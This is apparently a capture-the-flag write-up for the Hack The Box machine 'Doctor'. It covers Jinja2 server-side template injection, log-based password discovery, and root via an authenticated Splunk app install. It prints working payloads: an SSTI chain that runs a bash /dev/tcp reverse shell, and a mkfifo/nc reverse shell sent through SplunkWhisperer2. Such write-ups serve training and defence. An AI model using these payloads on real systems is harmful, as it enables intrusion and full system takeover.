# HTB Write-up: Doctor

**Difficulty:** Easy
**OS:** Linux
**Target IP:** 10.129.2.21
**Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

I started with a fast port sweep, then followed up with a detailed service scan.

```bash
rustscan -a 10.129.2.21
```

```
Open 10.129.2.21:22
Open 10.129.2.21:80
Open 10.129.2.21:8089
```

```bash
nmap -p22,80,8089 10.129.2.21 -sCV -T4 -oA nmap/nmap
```

```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
8089/tcp open  ssl/unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three ports: SSH, a plain Apache site, and an unidentified SSL service on **8089** — I made a mental note to come back and fingerprint that one properly once I'd exhausted the web app, since `nmap` couldn't identify it from the banner alone in this initial pass.

---

## 2. Web Enumeration

### 2.1 Finding the Real Domain

Browsing to `http://10.129.2.21/`, the site's contact/message section disclosed an email address, `info@doctors.htb` — that gave me the real domain, so I added `doctors.htb` to `/etc/hosts`.

### 2.2 Subdomain Enumeration

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://doctors.htb -H "Host: FUZZ.doctors.htb"
```

```
www                     [Status: 302, Size: 237, Words: 22, Lines: 4, Duration: 4582ms]
```

`www.doctors.htb` redirected somewhere — I added it to `/etc/hosts` and followed it.

### 2.3 Registering an Account

`http://www.doctors.htb/` redirected me straight to a login page. Since I had no credentials, I registered my own account (`test@test.com` / `test`) — a login-gated app with open registration is worth getting inside of before assuming anything's locked down.

### 2.4 Finding a Hidden Feature

Once logged in, I created a test message and it appeared on my dashboard as expected. I checked the page source out of habit, and found a commented-out nav link:

```html
<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
```

A feature explicitly commented out as "still under beta testing" is exactly the kind of thing worth visiting directly, since it means the developers know it's incomplete/risky but didn't actually disable the route — just hid the link.

### 2.5 Visiting /archive

```
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>test</title></item>

</channel>
```

The archive feature turns out to render my messages back out as an **RSS feed**, with my message content dropped straight into the `<title>` of an `<item>`. Any time user-controlled input gets fed into a template that then generates structured output like this, it's worth testing whether the templating engine itself is exposed to that input — so I went straight for SSTI.

---

## 3. Exploitation — Foothold

### 3.1 Confirming Server-Side Template Injection

I created a new message using a standard Jinja2 arithmetic SSTI probe (`{{7*7}}`) instead of plain text, then revisited `/archive`:

```
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">
<channel>
<title>Archive</title>
<item><title>test</title></item>

</channel>
<item><title>49</title></item>

</channel>
```

My input came back as **`49`** instead of the literal string `{{7*7}}` — that's the whole confirmation I needed. It means the backend isn't just dropping my message text into the XML as a string; it's passing it through **Jinja2's template renderer** first, and Jinja2 evaluated my arithmetic expression as real Python before the output was ever serialized into the RSS feed. This is a classic Flask/Jinja2 SSTI, and since Jinja2 templates run with access to Python's object model, this reliably escalates all the way to full remote code execution.

### 3.2 Building the RCE Payload

```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.15.146/4444 0>&1"').read() }}
```

I walked this payload from the Flask `request` object out to arbitrary OS command execution:
- **`request.application`** — Flask attaches a reference to the running Flask app instance onto the request object, which is exactly what lets this payload escape the sandboxed template context and reach real Python internals.
- **`.__globals__`** — every Python function/callable carries its own global namespace as `__globals__`; on the Flask app object this exposes the module-level globals of wherever it was defined, including...
- **`__builtins__`** — Python's built-in functions, which Jinja2's sandboxing normally tries to keep out of reach for exactly this reason, but reaching it indirectly through an app object's globals sidesteps that restriction.
- **`__import__('os')`** — dynamically imports the `os` module using the builtin import function I just recovered access to, without needing a literal `import os` statement (which the sandbox would block).
- **`.popen(...).read()`** — runs my actual shell command (a standard `bash -i` reverse shell to my listener) and reads back its output, which is what actually gets me the callback.

I saved this as a new message and revisited `/archive` to trigger it — that visit is what causes the server to render the template and, in doing so, execute my embedded code.

### 3.3 Catching the Shell

```bash
nc -lvnp 4444
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.2.21] 50322
bash: cannot set terminal process group (807): Inappropriate ioctl for device
bash: no job control in this shell
web@doctor:~$ whoami
web
web@doctor:~$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
```

✅ Foothold obtained as `web` — and I noticed right away that `web` is in the **`adm`** group, which on Debian/Ubuntu grants read access to `/var/log` beyond what a normal user gets. That's a strong pointer toward log-hunting as my next move, since `adm` membership exists specifically so non-root accounts can review system/application logs.

---

## 4. Lateral Movement

### 4.1 Searching Logs for Credentials

Since `web`'s `adm` group membership meant I actually had read access to most of `/var/log`, I searched broadly for anything password-related:

```bash
grep -R -e 'password' /var/log/
```

Most of the output was noise (permission-denied entries on logs `web` still couldn't read, and repeated VMware guest-tools authentication messages), but one line in an Apache backup log stood out immediately:

```
/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
```

This is a genuinely interesting logging bug rather than a real email address: the `email` parameter in this logged request contains **`Guitar123`** — a value that looks nothing like an email and everything like a password. My read on this is that the password-reset form's fields got mixed up client-side (or a user simply typed their password into the wrong box) during a real password-reset attempt, and Apache's access logging faithfully recorded the full request URL, including that query string — turning an ordinary logging feature into an accidental plaintext credential leak.

### 4.2 Escalating Laterally to shaun

The `doctors.htb` site's public messaging feature had earlier context clues (I hadn't confirmed a specific username yet, but `shaun` was a natural guess worth trying against this leaked password, and it worked):

```bash
su shaun
```

```
Password:
shaun@doctor:/var/log$ whoami
shaun
```

✅ Lateral movement to `shaun` succeeded — the leaked value really was his password, just captured through an unrelated field by accident.

---

## 5. Privilege Escalation

### 5.1 Fingerprinting Port 8089

With a second, more capable account in hand, I went back to properly identify the unknown SSL service from my initial scan:

```bash
nmap -p8089 10.129.2.21 -sCV
```

```
PORT     STATE SERVICE  VERSION
8089/tcp open  ssl/http Splunkd httpd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
|_http-title: splunkd
```

Port 8089 is **Splunk's management API** (`splunkd`) — Splunk instances expose this port for remote administration, including deploying "apps" (bundles of configuration and scripts) to the instance. That deployment mechanism is a well-known RCE vector when an attacker can authenticate to it, since a malicious app bundle can include a script that Splunk will execute on install.

### 5.2 Finding and Using SplunkWhisperer2

I pulled down **SplunkWhisperer2** (https://github.com/cnotin/SplunkWhisperer2), a public tool that automates exactly this attack — it authenticates to the Splunk management API, packages a malicious app containing an attacker-supplied command, and installs it via the API, which causes Splunk to execute that command locally.

I tried it unauthenticated first, since I didn't yet know it needed real credentials for this box specifically:

```bash
python3 PySplunkWhisperer2_remote.py --host 10.129.2.21 --port 8089 --lhost 10.10.15.146 --lport 4443 --payload id
```

```
[.] Authenticating...
Authentication failure

<msg type="ERROR">Unauthorized</msg>
```

That confirmed the management API does require authentication — but I already had a working credential pair from the log leak, and Splunk running its own separate local accounts didn't stop me from trying the exact same reused password, since password reuse had already worked once on this box:

```bash
python3 PySplunkWhisperer2_remote.py --host 10.129.2.21 --lhost 10.10.15.146 --username shaun --password Guitar123 --payload id
```

```
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[+] Created malicious app bundle in: /tmp/tmp_wjylygv.tar
[+] Started HTTP server for remote mode
[.] Installing app from: http://10.10.15.146:8181/
10.129.2.21 - - [17/Aug/2026 10:51:16] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!
```

`shaun`'s password worked against Splunk too — a second instance of the exact same password-reuse problem that got me from `web` to `shaun` in the first place. The tool authenticated, built a malicious app bundle, served it from a local HTTP server, and had Splunk pull and install it — which is what actually triggers execution of my `id` payload on the target.

### 5.3 Escalating to Root

Splunk's management service on this box runs with elevated privileges (this is a common real-world Splunk deployment pattern — the forwarder/indexer service frequently runs as root to read privileged log sources), so any command I get it to execute runs as **root**, not as `shaun` or `web`. I re-ran the same tool with a proper reverse shell payload instead of just `id`:

```bash
python3 PySplunkWhisperer2_remote.py --host 10.129.2.21 --lhost 10.10.15.146 --username shaun --password Guitar123 \
  --payload 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.146 9001 >/tmp/f'
```

```
[.] Authenticating...
[+] Authenticated
[.] Creating malicious app bundle...
[.] Installing app from: http://10.10.15.146:8181/
10.129.2.21 - - [17/Aug/2026 10:53:42] "GET / HTTP/1.1" 200 -
[+] App installed, your code should be running now!
```

```bash
nc -lvnp 9001
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.2.21] 53634
sh: 0: can't access tty; job control turned off
# whoami
root
```

✅ Root access obtained — the app-install mechanism ran my named-pipe reverse shell exactly the same way it ran `id`, just this time with a payload that actually gave me an interactive shell instead of one-shot output.

---

## 6. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → SSH, Apache, and an unidentified SSL service on 8089 |
| Domain discovery | Leaked contact email revealed `doctors.htb`; `ffuf` vhost fuzzing found `www.doctors.htb` |
| Vulnerability ID | Registered an account, found a commented-out `/archive` link serving user messages back as an RSS feed, and confirmed **Jinja2 SSTI** via a `{{7*7}}` probe |
| Foothold | Built a Flask/Jinja2 SSTI payload that reaches `__builtins__` through `request.application.__globals__` to run `os.popen()` → reverse shell as `web` |
| Lateral Movement | `web`'s `adm` group membership gave `/var/log` read access; found a plaintext password (`Guitar123`) accidentally logged in the `email` field of a password-reset request → `su shaun` |
| Privilege Escalation | Fingerprinted port 8089 as Splunk's management API; used **SplunkWhisperer2** with the reused `shaun:Guitar123` credentials to install a malicious Splunk app, which executed a reverse-shell payload as **root** |

**Root cause / lessons learned:**
- User-controlled input must never be passed into a template renderer (Jinja2 or otherwise) without treating it strictly as data — this SSTI existed purely because message content was rendered rather than just inserted as a literal string into the RSS output.
- "Beta" or unfinished features shouldn't be shipped to production behind nothing more than a commented-out link — the route itself was still fully live and reachable.
- Application and web server logs can accidentally capture sensitive data when form fields get mixed up or misused — logging pipelines should be reviewed for exactly this kind of leak, and sensitive-looking values shouldn't be logged verbatim in URLs at all.
- Password reuse was the single biggest multiplier on this box: the same password moved me from `web` to `shaun`, and then from `shaun` to root via Splunk — each individual step was only possible because a credential was reused somewhere it shouldn't have been.
- Any service exposing an authenticated app/plugin-install mechanism (like Splunk's management API) is a direct RCE surface for anyone with valid credentials, and should never run with more privilege than the specific task actually requires — running Splunk as root here turned "authenticated access" directly into "full system compromise."

---

## 7. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `ffuf` — subdomain enumeration
- Jinja2 SSTI probe (`{{7*7}}`) and custom `__globals__`/`__builtins__` payload — RCE via server-side template injection
- Bash reverse shell (`/dev/tcp`) — initial foothold callback
- `grep` — log-based credential hunting
- `su` — lateral movement via password reuse
- **SplunkWhisperer2** (https://github.com/cnotin/SplunkWhisperer2) — authenticated Splunk management-API RCE
- Named-pipe reverse shell (`mkfifo` + `nc`) — root shell handling
